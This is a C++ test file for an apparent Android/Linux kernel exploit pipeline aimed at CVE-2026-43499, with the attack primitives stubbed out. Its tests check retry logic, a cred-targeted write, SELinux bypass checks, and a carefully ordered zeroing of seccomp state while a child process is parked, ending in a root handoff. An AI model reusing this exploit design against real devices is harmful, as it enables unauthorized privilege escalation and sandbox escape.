/*
 * Host data-flow test: drive the real cve_2026_43499 backend and root_child
 * frontend through Pipeline::run with the attack primitives stubbed. The
 * stage sequence, retries, chain rounds and handoff all execute unchanged; the
 * script decides the verify/probe outcomes.
 */

#include "host_attack_script.hpp"

#include "kernel/target.h"
#include "kernel/runtime_struct_offsets.h"
#include "memory/payload_builder.h"
#include "route/pipeline.hpp"
#include "session/backend/cve_2026_43499_backend.hpp"
#include "session/exploit_session.hpp"
#include "session/root_child_frontend.hpp"

#include <cstdio>
#include <cstdint>
#include <string>

namespace {
    using ghostlock::host::script;

    void reset_script() {
        auto &s = script();
        s = ghostlock::host::HostAttackScript{};
        s.spawn_default = {4242, 0xffff888000001000ULL};
    }

    int32_t count_calls(const char *name) {
        int32_t n = 0;
        for (const auto &call : script().calls) {
            if (call == name) ++n;
        }
        return n;
    }

    bool expect(bool condition, const char *message) {
        if (!condition) std::printf("FAIL: %s\n", message);
        return condition;
    }

    /* `app_flow` selects the environment the backend runs in:
     *   true  -> zygote app process WITH a seccomp filter (W3 runs)
     *   false -> adb/shell flow reporting Seccomp: 0 (W3 skips itself)
     * Both must reach the handoff; only the app flow writes seccomp state. */
    ghostlock::runtime::RunResult run_once(bool app_flow = false,
                                           uint32_t w3_attempts = 0) {
        script().process_has_seccomp_value = app_flow ? 1 : 0;
        ghostlock::profile::kernel_offsets decoded{};
        decoded.meta.kernel_major = 6;
        decoded.execution.w1_attempts = 3;
        decoded.execution.w1_scratch_repair_attempts = 1;
        decoded.execution.w2_attempts = 4;
        decoded.execution.w3_chain_rounds = 2;
        decoded.execution.w3_attempts = w3_attempts;
        ghostlock::session::g_exploit_session.profile =
                ghostlock::profile::TargetProfile::from(&decoded);
        return ghostlock::runtime::Pipeline<
            ghostlock::session::frontend::RootChildPolicy,
            ghostlock::session::backend::Cve2026_43499Policy,
            ghostlock::route::SelectPolicy>::run(
            ghostlock::session::g_exploit_session, decoded, nullptr, true);
    }

    bool test_happy_path() {
        reset_script();
        const auto result = run_once();
        bool ok = true;
        ok &= expect(result.code == ghostlock::runtime::RunCode::Completed,
                     "happy: pipeline should complete");
        ok &= expect(result.stage == ghostlock::runtime::RunStage::Frontend,
                     "happy: terminal stage is the frontend");
        ok &= expect(count_calls("spawn") == 1, "happy: exactly one victim spawn");
        ok &= expect(count_calls("verify_w2") >= 1, "happy: W2 verified");
        /* Shell flow: no app seccomp filter, so W3 is skipped entirely. */
        ok &= expect(count_calls("verify_seccomp") == 0,
                     "happy: W3 seccomp probe not reached in the shell flow");
        ok &= expect(count_calls("route") >= 1, "happy: at least one route write");
        return ok;
    }

    /* App flow (the shipped X6840 default): W3 clears seccomp, so the seccomp
     * probe must be reached and the run must still complete. */
    bool test_happy_path_app_flow() {
        reset_script();
        const auto result = run_once(/*app_flow=*/true, /*w3_attempts=*/3);
        bool ok = true;
        ok &= expect(result.code == ghostlock::runtime::RunCode::Completed,
                     "app: pipeline completes");
        ok &= expect(result.stage == ghostlock::runtime::RunStage::Frontend,
                     "app: terminal stage is the frontend");
        ok &= expect(count_calls("stop_child") == 1, "app: child parked once");
        ok &= expect(count_calls("verify_seccomp") >= 1,
                     "app: W3 seccomp probe ran");
        return ok;
    }

    /* A shell flow has no app filter (Seccomp: 0), so W3 must touch nothing. */
    bool test_w3_skipped_in_shell_flow() {
        reset_script();
        const auto result = run_once(/*app_flow=*/false, /*w3_attempts=*/3);
        bool ok = true;
        ok &= expect(result.code == ghostlock::runtime::RunCode::Completed,
                     "shell: pipeline completes");
        ok &= expect(count_calls("stop_child") == 0, "shell: child never parked");
        ok &= expect(count_calls("continue_child") == 0, "shell: child never resumed");
        ok &= expect(count_calls("verify_seccomp") == 0,
                     "shell: no seccomp probe");
        for (const auto &write : script().writes) {
            const bool seccomp_target =
                write.target == script().spawn_default.task ||
                write.target == script().spawn_default.task +
                                     ghostlock::profile::task_seccomp_off();
            if (seccomp_target) {
                ok &= expect(false, "shell: no seccomp-adjacent write issued");
            }
        }
        return ok;
    }

    bool test_w2_retry_until_success() {
        reset_script();
        script().verify_w2 = {0, 0, 1};
        const auto result = run_once();
        bool ok = true;
        ok &= expect(result.code == ghostlock::runtime::RunCode::Completed,
                     "retry: pipeline completes after late W2 success");
        /* First attempt verifies once; the second attempt verifies before and
         * after the write, where the queued success lands. */
        ok &= expect(count_calls("verify_w2") == 3, "retry: verify_w2 called 3 times");
        ok &= expect(count_calls("spawn") == 1, "retry: same child retried, not respawned");
        return ok;
    }

    bool test_w2_exhausts_attempts() {
        reset_script();
        script().verify_w2_default = 0;
        const auto result = run_once();
        const uint32_t attempts =
                ghostlock::session::g_exploit_session.profile.w2_attempts();
        bool ok = true;
        ok &= expect(result.code == ghostlock::runtime::RunCode::Failed,
                     "exhaust: pipeline fails");
        ok &= expect(result.stage == ghostlock::runtime::RunStage::Backend,
                     "exhaust: failure is in the backend");
        ok &= expect(count_calls("verify_w2") >= static_cast<int32_t>(attempts),
                     "exhaust: verify_w2 ran at least w2_attempts times");
        return ok;
    }

    bool test_selinux_retry_then_w2() {
        reset_script();
        script().verify_selinux = {0, 1};
        const auto result = run_once();
        bool ok = true;
        ok &= expect(result.code == ghostlock::runtime::RunCode::Completed,
                     "selinux: pipeline completes");
        ok &= expect(count_calls("verify_selinux") == 2,
                     "selinux: verify_selinux retried twice");
        return ok;
    }

    /* W3 may only use the primitive's zero-valued leaf arm, and only while the
     * child is parked: zeroing seccomp.mode with TIF_SECCOMP still set is a BUG
     * in __secure_computing(), and a running child could fork in between (fork
     * re-arms the flag while mode is still FILTER). */
    bool test_w3_zero_store_plan() {
        reset_script();
        const auto result = run_once(/*app_flow=*/true, /*w3_attempts=*/3);
        bool ok = true;

        const uintptr_t task = script().spawn_default.task;
        const uintptr_t flags_target = task + 0x00; /* thread_info.flags */
        const uintptr_t mode_target =
                task + ghostlock::profile::task_seccomp_off();
        const std::string flags_tag =
                ghostlock::host::HostAttackScript::write_tag(flags_target, 1, 1);
        const std::string mode_tag =
                ghostlock::host::HostAttackScript::write_tag(mode_target, 1, 1);

        const auto position = [](const std::string &needle) {
            const auto &timeline = script().timeline;
            for (size_t i = 0; i < timeline.size(); ++i) {
                if (timeline[i] == needle) return static_cast<int32_t>(i);
            }
            return -1;
        };

        const int32_t stopped = position("stop_child");
        const int32_t resumed = position("continue_child");
        const int32_t flags_at = position(flags_tag);
        const int32_t mode_at = position(mode_tag);

        ok &= expect(result.code == ghostlock::runtime::RunCode::Completed,
                     "w3-plan: pipeline completes");
        ok &= expect(stopped >= 0 && resumed > stopped,
                     "w3-plan: child parked and resumed once");
        ok &= expect(flags_at > stopped && flags_at < resumed,
                     "w3-plan: thread_info.flags zeroed inside the parked window");
        ok &= expect(mode_at > stopped && mode_at < resumed,
                     "w3-plan: seccomp mode word zeroed inside the parked window");
        ok &= expect(flags_at < mode_at,
                     "w3-plan: flags cleared before mode (no __secure_computing BUG)");

        /* Every W3 store must be the zero leaf arm; W2 is the only pointer arm
         * and it targets cred. A non-zero, non-pointer value would never land. */
        bool w3_modes_sane = true;
        for (const auto &write : script().writes) {
            const bool in_w3 = write.target == flags_target || write.target == mode_target;
            if (!in_w3) continue;
            if (write.mode != static_cast<int32_t>(ghostlock::memory::WriteMode::Zero)) {
                w3_modes_sane = false;
            }
            if (write.leaf != 1) w3_modes_sane = false;
        }
        ok &= expect(w3_modes_sane, "w3-plan: W3 stores are Zero/leaf only");
        ok &= expect(count_calls("verify_seccomp") >= 1,
                     "w3-plan: forked finit_module probe ran after the clear");
        return ok;
    }

    bool test_w3_parked_child_failure_keeps_mode() {
        reset_script();
        /* The child will not park: W3 must bail out without zeroing seccomp.mode,
         * because a mode write behind a live TIF_SECCOMP is the panic path. */
        script().stop_child_result = 0;
        const auto result = run_once(/*app_flow=*/true, /*w3_attempts=*/3);
        bool ok = true;
        const uintptr_t task = script().spawn_default.task;
        const uintptr_t mode_target =
                task + ghostlock::profile::task_seccomp_off();
        const std::string mode_tag =
                ghostlock::host::HostAttackScript::write_tag(mode_target, 1, 1);
        bool mode_written = false;
        for (const auto &entry : script().timeline) {
            if (entry == mode_tag) mode_written = true;
        }
        ok &= expect(result.code == ghostlock::runtime::RunCode::Completed,
                     "w3-nopark: run still hands off (temporary root)");
        ok &= expect(!mode_written, "w3-nopark: seccomp mode never zeroed");
        ok &= expect(count_calls("continue_child") == 0,
                     "w3-nopark: no resume of a child that never parked");
        return ok;
    }
} // namespace

int main() {
    bool ok = true;
    ok &= test_happy_path();
    ok &= test_happy_path_app_flow();
    ok &= test_w3_skipped_in_shell_flow();
    ok &= test_w2_retry_until_success();
    ok &= test_w2_exhausts_attempts();
    ok &= test_selinux_retry_then_w2();
    ok &= test_w3_zero_store_plan();
    ok &= test_w3_parked_child_failure_keeps_mode();
    if (ok) {
        std::puts("backend_dataflow_test: ok");
        return 0;
    }
    return 1;
}
